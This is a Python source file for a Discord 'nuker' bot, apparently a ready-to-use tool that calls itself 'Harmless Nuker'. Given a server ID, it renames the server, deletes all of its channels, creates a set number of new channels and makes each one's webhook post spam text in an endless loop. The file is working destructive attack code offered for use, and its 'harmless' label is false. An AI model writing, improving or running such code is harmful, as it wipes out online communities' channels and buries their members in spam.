import discord
from discord.ext import commands
import json
import os
import asyncio
import ctypes
import fade
from colorama import Fore, Style, init

init()

def setwindowsize(width, height):
    os.system(f"mode con: cols={width} lines={height}")

setwindowsize(114, 28)
line = fade.purpleblue("──────────────────────────────────────────────────────────────────────────────────────────────────────────────────")
logo = fade.purplepink(""" ██╗░░██╗░█████╗░██████╗░███╗░░░███╗██╗░░░░░███████╗░██████╗░██████╗  ███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░
 ██║░░██║██╔══██╗██╔══██╗████╗░████║██║░░░░░██╔════╝██╔════╝██╔════╝  ████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗
 ███████║███████║██████╔╝██╔████╔██║██║░░░░░█████╗░░╚█████╗░╚█████╗░  ██╔██╗██║██║░░░██║█████═╝░█████╗░░██████╔╝
 ██╔══██║██╔══██║██╔══██╗██║╚██╔╝██║██║░░░░░██╔══╝░░░╚═══██╗░╚═══██╗  ██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██╔══██╗
 ██║░░██║██║░░██║██║░░██║██║░╚═╝░██║███████╗███████╗██████╔╝██████╔╝  ██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║
 ╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚══════╝╚══════╝╚═════╝░╚═════╝░  ╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
""")
version = fade.purpleblue("""                                                       [ 3.0.0 ]
""")

intents = discord.Intents.all()
client = commands.Bot(command_prefix='!', intents=intents)

def title(title):
    ctypes.windll.kernel32.SetConsoleTitleW(title)

def read_settings():
    with open('config.json', 'r') as file:
        return json.load(file)

settings = read_settings()

def read_token():
    with open('token.json', 'r') as file:
        token = json.load(file)['token']
    return token

async def send_messages(channel):
    try:
        webhook = await channel.create_webhook(name=settings["webhook_name"])
        while True:
            await webhook.send(settings["spam_text"], wait=True)
    except Exception as e:
        print(f"You have been rate limited {e}")

async def nuke_server(server):
    try:
        print(f'Nuking server {server.name}...')
        await server.edit(name=settings["server_name"])
        channels = await server.fetch_channels()
        delete_tasks = []
        for channel in channels:
            delete_tasks.append(asyncio.create_task(del_channel(channel))) 
        await asyncio.gather(*delete_tasks, return_exceptions=True)
        
        create_tasks = []
        for i in range(settings["num_channels"]):
            create_tasks.append(asyncio.create_task(spam_channel(server, i))) 
        await asyncio.gather(*create_tasks)

    except Exception as e:
        print(f"Error nuking server: {e}")

async def del_channel(channel): 
    try:
        await channel.delete()
    except Exception as e:
        print(f"Failed to delete {channel.name}: {e}")

async def spam_channel(server, index):
    try:
        new_channel = await server.create_text_channel(name=f'{settings["channel_name"]}-{index+1}')
        await send_messages(new_channel)
    except Exception as e:
        print("")

@client.event
async def on_ready():
    bot_name = str(client.user)
    title(f'Harmless Nuker | bot name is {bot_name} | V3.0.0')
    os.system('cls')
    print(line)
    print(logo)
    print(line)
    print(version)
    server_id = input(f"{Fore.GREEN}[1] {Fore.RESET}ServerId: {Fore.RESET}")
    server = client.get_guild(int(server_id))
    if server:
        await nuke_server(server)

client.run(read_token())
